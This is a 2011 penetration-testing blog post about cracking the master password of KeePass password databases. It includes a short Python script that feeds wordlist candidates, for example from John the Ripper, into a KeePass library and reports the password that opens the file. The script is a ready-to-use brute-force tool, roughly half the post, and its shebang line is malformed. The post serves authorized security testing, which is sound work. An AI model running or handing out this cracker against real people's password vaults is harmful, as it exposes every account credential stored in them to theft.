---
layout: post
title: Brute-forcing  Keepass  password key-chains
date: '2011-08-03T11:09:00.000+02:00'
author: Xavier Garcia
tags:
- pentest
- brute-force
- keepass
modified_time: '2011-08-03T11:09:30.760+02:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-996903371796116669
blogger_orig_url: http://www.shellguardians.com/2011/08/brute-forcing-keepass-password-key.html
---
From the website:

> KeePass is a free open source password manager, which helps you to manage your passwords in a secure way. You can put all your passwords in one database, which is locked with one master key or a key file. So you only have to remember one single master password or select the key file to unlock the whole database. The databases are encrypted using the best and most secure encryption algorithms currently known (AES and Twofish).

This open source password manager is available on Window, Mac, Linux, Android and iPhone. Hence, chances are that we will find one of these keychain files during a pen-test.

Looking for ways to brute-force the password I stumbled across with this [python implementation](https://github.com/brettviren/python-keepass) that is able to read the file and dump its contents. It should not be very inefficient since it is using [pycrypto](https://www.dlitz.net/software/pycrypto/doc/), that is implemented in C.

The code is fairly simple and expects the list of passwords  in the standard input.  One possibility is to use John the Ripper for this task :)

You can find the code below.

```python
#! /usr/env/python  
  
#https://github.com/brettviren/python-keepass  
  
# reads a list of pass words from the standard input  
# john the ripper may be used to feed the application  
  
from keepass import kpdb  
import sys  
import fileinput  
  
for line in sys.stdin:  
    passwd=line.strip("\n")  

    try:  
        db = kpdb.Database(sys.argv[1],passwd)  
        print "Valid password found for %s : %s" % (sys.argv[1],passwd)  
        sys.exit(0)  
    except ValueError:  
        pass
```
